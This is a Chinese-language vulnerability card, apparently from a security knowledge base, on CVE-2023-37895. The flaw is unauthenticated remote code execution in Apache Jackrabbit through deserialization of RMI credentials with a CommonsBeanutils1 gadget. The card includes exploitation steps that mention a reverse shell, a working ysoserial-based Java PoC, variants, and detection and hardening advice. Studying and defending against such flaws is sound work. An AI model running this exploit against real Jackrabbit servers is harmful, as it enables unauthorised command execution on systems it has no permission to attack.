---
id: web-java-component-jackrabbit-rmi-simplecredentials-cb1-rce
title: Apache Jackrabbit RMI /rmi 端点反序列化 SimpleCredentials.attributes：CB1 链无认证 RCE（CVE-2023-37895）
type: scenario
domain: web
path: web/java/component
technique: jackrabbit-rmi-credentials-deserialization-cb1
aliases:
- Jackrabbit RMI RCE
- CVE-2023-37895
- SimpleCredentials 反序列化
- RemoteBindingServlet 反序列化
- jackrabbit /rmi
- URLRemoteRepository 反序列化
tags:
- web
- java
- deserialization
- rmi
- jackrabbit
- commons-beanutils
- cb1
- code-audit
cve:
- CVE-2023-37895
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: 1.0.0 <= apache:jackrabbit < 2.20.11；2.21.0 <= apache:jackrabbit < 2.21.18
verification:
  verified_by: verifier-V643
  verified_at: '2026-11-13T02:31:06+08:00'
  notes: 已对照原文与7张图逐图核对：/rmi RemoteBindingServlet(web.xml映射)、doGet序列化ServerRepository Stub、URLRemoteRepository→login(Credentials)流程与截图01-04一致；服务端unmarshalValue对javax.jcr.Credentials readObject先于方法执行、HashMap.readObject→CB1(PriorityQueue/BeanComparator/TemplatesImpl)调用栈与截图05/06一致；SimpleCredentials.attributes HashMap载体、web模块commons-beanutils依赖、ysoserial CommonsBeanutils1 EXP与原文一致；影响版本区间原文明确(1.0.0<=apache:jackrabbit<2.20.11；2.21.0<=<2.21.18)已按原文设置；修复diff截图07显示2.20.11删除commons-beanutils。已将'2.21.18删依赖'的推断表述改为'原文仅展示2.20.10→2.20.11 diff'。dedup仅自身命中，related为通用RMI参数反序列化卡与CB1 gadget卡，非同链；库内无其它Jackrabbit/37895卡。未本地复现RCE。
---

## 一句话结论

Apache Jackrabbit webapp 的 `/rmi`（`RemoteBindingServlet`）与 standalone RMI 端口把客户端传入的 `Credentials` 参数直接反序列化；`SimpleCredentials.attributes` 是 `HashMap`，攻击者在其中放入 commons-beanutils 的 CB1 gadget（PriorityQueue+BeanComparator+TemplatesImpl），调用 `RemoteRepository.login(credentials)` 时服务端在鉴权前 `readObject` 即触发命令执行（CVE-2023-37895），全程无需有效账号。

## 原理

- **入口**：Jackrabbit webapp `web.xml` 把 `org.apache.jackrabbit.servlet.remote.RemoteBindingServlet` 映射到 `/rmi`；`doGet` 将 `ServerRepository` 通过 `RemoteObject.toStub()` 序列化返回给客户端，客户端由此拿到远程 `RemoteRepository` 代理（`URLRemoteRepository("http://host:8090/<ctx>/rmi")` 或 `RMIRemoteRepository("//host/jackrabbit.repository")` 经 1099 注册中心）。standalone 部署同时暴露 RMI 服务端口。
- **为什么参数会被反序列化**：客户端调用远程 `login(Credentials, String)` 时，RMI 把实参序列化传输；服务端 `UnicastServerRef.dispatch` → `UnicastRef.unmarshalValue` 对非基本类型参数执行 `var1.readObject()`，在方法体（真正的 `login` 鉴权）执行之前完成反序列化。
- **可控点**：`Credentials` 接口继承 `Serializable`；`SimpleCredentials` 的 `attributes` 字段是 `HashMap`，且提供 `setAttribute(String,Object)`，任意对象都可放入。
- **gadget 来源**：Jackrabbit web 模块的 Maven 依赖包含 `commons-beanutils`（受影响版本默认打包），因此可用 ysoserial `CommonsBeanutils1`：`HashMap.readObject` → value 的 `PriorityQueue.readObject` → `heapify` → `BeanComparator.compare` → `PropertyUtils.getProperty(o,"outputProperties")` → `TemplatesImpl.getOutputProperties` → `newTransformer` → 加载 `_bytecodes` 恶意类执行（调用栈见下）。
- **为什么无需认证**：反序列化发生在 `ServerRepository.login` 真正校验凭据之前；攻击者调用 `login` 不必知道合法口令，对象一经 `readObject` 即已触发。
- 服务端调用栈（原文，节选）：
  ```
  Runtime.exec ← Pwner(ysoserial) <clinit>
  TemplatesImpl.newTransformer
  PropertyUtilsBean.getProperty ← BeanComparator.compare
  PriorityQueue.heapify ← PriorityQueue.readObject
  HashMap.readObject
  UnicastRef.unmarshalValue ← UnicastServerRef.dispatch
  TCPTransport$ConnectionHandler.run
  ```
- 修复方式：原文对比 2.20.10→2.20.11 的 web 模块 pom，`commons-beanutils` 依赖被删除，classpath 不再具备该链（2.21.18 为 2.21.x 分支对应修复版本，原文未展示其 diff）。

## 触发条件

- 目标为受影响版本：`1.0.0 <= apache:jackrabbit < 2.20.11` 或 `2.21.0 <= apache:jackrabbit < 2.21.18`（原文标注）。
- Jackrabbit webapp 的 `/rmi` 路径或 standalone RMI 服务端口可从攻击者网络访问。
- 服务端 classpath 含可用的 commons-beanutils（受影响版本的 web 模块默认依赖）且 JDK 未拦截 `TemplatesImpl` 类链。
- 无需任何有效 JCR 账号；方法调用的参数反序列化先于鉴权。

## 利用步骤

1. 确认目标版本与入口：访问 `http://target:8080/<ctx>/rmi` 能返回序列化 Stub 即入口存在；或探测 standalone RMI 端口与 `jackrabbit.repository` 绑定名。
2. 用 ysoserial 生成 `CommonsBeanutils1` payload（命令为 `calc` 或反弹 shell）。
3. 构造 `SimpleCredentials("admin","admin".toCharArray())`，`setAttribute("admin", payloadObject)`。
4. 用 `URLRemoteRepository("http://target:8080/<ctx>/rmi")`（或经注册中心 `RMIRemoteRepository`）调用 `login(simpleCredentials)`。
5. 服务端在 `unmarshalValue` 中反序列化 `SimpleCredentials` 时触发 CB1 链执行命令。

## PoC

```java
Class<? extends ObjectPayload> payloadClass =
        ObjectPayload.Utils.getPayloadClass("CommonsBeanutils1");
ObjectPayload payload = (ObjectPayload) payloadClass.newInstance();
Object object = payload.getObject("calc");

SimpleCredentials simpleCredentials =
        new SimpleCredentials("admin", "admin".toCharArray());
simpleCredentials.setAttribute("admin", object);

URLRemoteRepository repository = new URLRemoteRepository(
        "http://localhost:8090/jackrabbit_webapp_war_exploded/rmi");
repository.login(simpleCredentials);
```

依赖：`jackrabbit-jcr-rmi`（客户端使用），服务端为 Apache Jackrabbit 2.20.10 webapp（Tomcat 部署）时实测可弹计算器。

## 变体与关联

- 变体：走 1099 注册中心 + `RMIRemoteRepository("//host/jackrabbit.repository")`，与 URLRemoteRepository 同一反序列化终点。
- 变体：`SimpleCredentials` 的其它字段（userID 为 String、password 为 char[]）不可直接承载对象，`attributes` 是唯一对象容器；其它实现 `Credentials` 的自定义类若在 classpath 中同样可作载体。
- 变体：commons-beanutils 在 classpath 时可用 CB1；若目标额外打包其它 gadget 库，也可替换为对应链（本质是任意 `Serializable` 参数反序列化）。
- 关联：[[web-java-rmi-remote-method-object-param-deserialization]]——RMI 方法参数反序列化的通用原理；本卡是 Jackrabbit 产品上的具体 CVE、固定 `Credentials` 参数与 CB1 链。
- 关联：[[web-java-deser-commonsbeanutils-cb1-beancomparator-priorityqueue]]——CB1 gadget 细节。
- 关联：[[web-java-rmi-registry-bind-rebind-deserialization]]——另一种 RMI 反序列化入口（注册中心 bind/rebind）。

## 检测与防御

- 修复：升级到 Jackrabbit 2.20.11 / 2.21.18 及以上；2.20.11 的 web 模块 pom 已移除 commons-beanutils 依赖（原文 diff 证据），2.21.18 为版本区间对应的 2.21.x 修复版本。
- 加固：对 RMI/JCR 远程接口启用 JEP 290 反序列化过滤器（`jdk.serialFilter`），限制 `TemplatesImpl`、`PriorityQueue`、`BeanComparator` 等类；RMI 端口仅对内网开放并加认证网关。
- 加固：不要向不可信网络暴露 `/rmi`；如仅用本地 ContentRepository，禁用远程绑定 Servlet。
- 检测：`/rmi` 或 RMI 端口收到 Java 序列化魔数 `AC ED 00 05` 的请求体、超长二进制参数；服务端出现 `UnmarshalException`/反序列化异常；随后进程派生 `calc`/`bash`/`cmd` 等子进程。
